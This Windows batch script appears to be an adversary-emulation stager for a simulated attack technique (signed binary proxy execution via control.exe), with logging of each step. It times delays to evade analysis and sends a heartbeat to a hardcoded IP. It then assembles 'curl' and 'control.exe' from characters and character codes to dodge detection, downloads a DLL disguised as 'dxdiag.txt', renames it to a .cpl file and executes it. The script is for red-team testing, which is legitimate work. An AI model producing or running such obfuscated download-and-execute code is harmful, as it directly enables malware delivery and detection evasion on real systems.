@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholders (plain literals - NEVER encoded)
SET ymbsd=%APPDATA%\8467\e8b1ff93
SET kdxln=Macula-Stage0-8467
SET jctvf=https://10.0.0.49
SET vbssp=https://10.0.0.49/stage/2/icon.png?8467-7
SET zxyqg=BALAM-S2BO
SET rwbgh=7
SET qmklw=dxdiag.txt
SET nyjhm=8467

REM Log file path
SET logfile=%APPDATA%\!rwbgh!\macula-simulations.log

REM Random 30-60s initial delay
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: initial_delay_start>> "!logfile!" 2>nul
SET /A rdelay=!RANDOM! %% 31 + 30
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: initial_delay_end>> "!logfile!" 2>nul

REM Heartbeat - curl command NOT obfuscated per rules
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!vbssp!"
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: heartbeat_end>> "!logfile!" 2>nul

REM Delay between operations (method 2)
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: delay_before_download>> "!logfile!" 2>nul
ping -n 8 127.0.0.1 >nul

REM Create directory if needed
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: create_directory_start>> "!logfile!" 2>nul
if not exist "!ymbsd!" mkdir "!ymbsd!"
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: create_directory_end>> "!logfile!" 2>nul

REM Obfuscate curl for download using character-by-character assembly
SET d1=c
SET d2=u
SET d3=r
SET d4=l
SET curlcmd=!d1!!d2!!d3!!d4!

REM Download DLL using obfuscated curl command
SET fullurl=!jctvf!/download.dll
SET outfile=!ymbsd!\!qmklw!
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: download_start>> "!logfile!" 2>nul
!curlcmd! -k -s -o "!outfile!" "!fullurl!"
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: download_end>> "!logfile!" 2>nul

REM Random delay
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: random_delay_start>> "!logfile!" 2>nul
SET /A rdelay2=!RANDOM! %% 11 + 5
timeout /t !rdelay2! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: random_delay_end>> "!logfile!" 2>nul

REM Rename to CPL file
SET cplfile=!ymbsd!\file.cpl
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: rename_start>> "!logfile!" 2>nul
move "!outfile!" "!cplfile!" >nul 2>nul
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: rename_end>> "!logfile!" 2>nul

REM Delay before execution
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: delay_before_exec>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul

REM Obfuscate control.exe using character code encoding
SET codes=99 111 110 116 114 111 108
SET ctrl=
FOR %%c IN (!codes!) DO (
    CMD /C EXIT %%c
    SET ctrl=!ctrl!!=ExitCodeChar!
)
SET ctrlbin=!ctrl!.exe

REM Execute CPL with obfuscated control.exe
SET RESULT=1
SET ERR_DETAIL=
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: execute_control_start>> "!logfile!" 2>nul
!ctrlbin! "!cplfile!"
IF NOT !ERRORLEVEL! == 0 (
    SET RESULT=0
    SET ERR_DETAIL=control_exec_failed
)
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: execute_control_end>> "!logfile!" 2>nul

REM Normalize timestamp for TTP logging
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime=%%I
SET ttp_timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!

REM Log TTP execution
echo [!ttp_timestamp!][!zxyqg!]: !rwbgh!-!nyjhm!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!>> "!logfile!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: final_delay_start>> "!logfile!" 2>nul
timeout /t 15 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!zxyqg!]: final_delay_end>> "!logfile!" 2>nul

ENDLOCAL